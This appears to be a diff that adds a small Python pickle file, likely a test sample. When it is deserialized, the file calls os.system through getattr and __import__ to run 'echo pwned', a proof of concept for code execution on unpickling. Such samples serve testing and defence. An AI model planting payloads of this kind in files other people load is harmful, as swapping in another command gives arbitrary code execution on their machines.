@@ -1,0 +1,6 @@
+€cbuiltins
+getattr
+cbuiltins
+__import__
+Œos…RŒsystem†RŒ
+echo pwned…R.
